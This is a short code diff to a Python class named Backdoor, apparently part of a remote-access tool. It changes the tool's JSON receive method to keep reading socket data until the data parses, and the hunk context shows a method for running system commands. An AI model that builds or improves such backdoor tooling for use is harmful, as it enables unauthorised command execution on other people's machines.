@@ -56,8 +56,13 @@ class Backdoor:
         Unwrap data into obj.
         Use this custom receive method instead of socket recv method.
         """
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
     def execute_system_command(self, command):
         """
